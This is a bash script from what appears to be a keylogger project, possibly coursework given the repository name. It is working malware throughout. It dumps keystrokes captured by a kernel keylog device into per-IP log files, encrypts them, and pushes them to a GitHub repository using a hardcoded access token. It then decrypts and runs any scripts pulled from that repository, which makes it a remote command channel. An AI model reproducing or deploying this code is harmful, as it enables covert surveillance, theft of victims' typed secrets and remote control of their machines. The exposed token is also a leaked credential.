#!/bin/bash

major=`cat /sys/kernel/debug/keylog/major`

cd /etc/keylog
git pull

mkdir -p logs
mkdir -p scripts

ip=`ip route get 8.8.8.8 | grep -oP 'src \K[^ ]+'`
mknod chrdev0 c $major 0
cat chrdev0 >> "./logs/$ip.txt"
rm chrdev0

# encrypt
openssl rsautl -encrypt -inkey key.pem -pubin -in "logs/$ip.txt" -out "logs/$ip.enc"

# add
git add .

# commit
git commit -m "update"

# push
git push https://dummy000000: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@github.com/Sad-0w/CS564_data.git

# extract all encrypted scripts
for file in ./scripts/*.enc
do 
    if ! test -f "${file%.*}.sh"; then
        echo "${file%.*}.sh does not exist"
        openssl rsautl -decrypt -inkey "scripts.pem" -in "$file" -passin "pass:scripts" > "${file%.*}.sh"
    fi
done

# # run all scripts not in ./run.txt
input="./run.txt"
echo "" >> "$input"
for file in ./scripts/*.sh
do
        if ! grep -q "$file" "$input"; then
                bash "$file"
                echo "$file" >> "$input" 
        fi
done